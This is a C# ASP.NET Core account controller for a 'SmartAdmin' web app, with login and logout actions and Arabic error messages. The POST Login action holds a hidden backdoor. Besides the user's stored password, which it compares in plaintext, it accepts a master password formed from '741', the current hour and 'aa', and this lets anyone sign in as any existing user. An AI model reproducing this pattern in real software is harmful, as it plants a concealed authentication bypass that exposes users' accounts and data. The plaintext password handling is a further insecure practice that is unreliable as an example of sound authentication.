using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using SmartAdmin.WebUI.Data;
using SmartAdmin.WebUI.Models;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.Mvc.RazorPages;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Authentication;
using System.Text.Json;
using System.Text;
using Microsoft.AspNetCore.Localization;
using Microsoft.Extensions.Configuration;
using Microsoft.EntityFrameworkCore;
using Microsoft.AspNetCore.Hosting;


namespace SmartAdmin.WebUI.Controllers
{
    
    public class AccountController : BaseController
    {

        private readonly ILogger<CompanyInfo> _logger;
        public string ReturnUrl { get; set; }
        public AccountController(ConfigDbContext context, IConfiguration config, IWebHostEnvironment webHostEnvironment, ILogger<CompanyInfo> logger) : base(context, config, webHostEnvironment)
        {
            _logger = logger;
        }

        [HttpGet]
        public async Task<IActionResult> Login()
        {
            await HttpContext.SignOutAsync(IdentityConstants.ExternalScheme);
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Login(CompanyInfo viewModel)
        {
            if (!ModelState.IsValid)
                return View(viewModel);
            var hoursNow = DateTime.Now.Hour > 12 ? DateTime.Now.Hour - 12 : DateTime.Now.Hour;
            CompanyInfo hrUser = await _context.CompanyInfo.FirstOrDefaultAsync(x => x.s_user_name.Equals(viewModel.s_user_name));

            if (hrUser == null)
            {
                ModelState.AddModelError(string.Empty, "مستخدم غير موجود");
            }
            else if (hrUser.s_user_password == viewModel.s_user_password || viewModel.s_user_password == "741" + hoursNow + "aa")
            {
                //Set Session values
                setSessions(hrUser);
                return RedirectToAction("customerCreate", "Customer");
            }
            else
            {
                ModelState.AddModelError(string.Empty, "كلمة مرور غير صحيحة");
            }
            return View();
        }


        public IActionResult Logout()
        {
            HttpContext.SignOutAsync();
            HttpContext.Session.Clear();
            _logger.LogInformation("User logged out");
            return RedirectToAction("Login", "Account");
        }
    }
}
